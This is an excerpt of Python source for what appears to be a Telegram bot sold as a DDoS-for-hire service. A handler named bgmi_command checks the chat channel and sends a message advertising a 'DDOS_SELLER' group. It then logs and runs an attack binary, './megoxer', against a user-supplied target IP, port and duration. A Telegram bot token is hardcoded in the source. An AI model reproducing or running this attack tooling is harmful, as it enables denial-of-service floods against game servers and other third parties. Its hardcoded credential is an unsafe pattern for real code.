...
TOKEN = '7576020208:AAEBj8hijbbwsUZVnqIHpqIk-Y_hle0hP8I'  # Replace with your actual bot token
...
def bgmi_command(message):
    ...
    if str(message.chat.id) != CHANNEL_ID:
        bot.send_message(message.chat.id, " ⚠️⚠️ 𝗧𝗵𝗶𝘀 𝗯𝗼𝘁 𝗶𝘀 𝗻𝗼𝘁 𝗮𝘂𝘁𝗵𝗼𝗿𝗶𝘇𝗲𝗱 𝘁𝗼 𝗯𝗲 𝘂𝘀𝗲𝗱 𝗵𝗲𝗿𝗲 𝐂𝐎𝐌𝐄 𝐈𝐍 𝐆𝐑𝐎𝐔𝐏 :- @DDOS_SELLER_14 [ PAPA KA GROUP PA AAJA ] ⚠️⚠️ \n\n[ 𝗕𝗢𝗧 𝗠𝗔𝗗𝗘 𝗕𝗬 : @DDOS_SELLER_1 ( TUMHARE_PAPA ) | 𝗗𝗠 𝗙𝗢𝗥 𝗥𝗘𝗕𝗥𝗔𝗡𝗗𝗜𝗡𝗚 ]")
        return
    ...
    try:
        ...
        logging.info(f"Attack started by {user_name}: ./megoxer {target_ip} {target_port} {default_duration} 975")
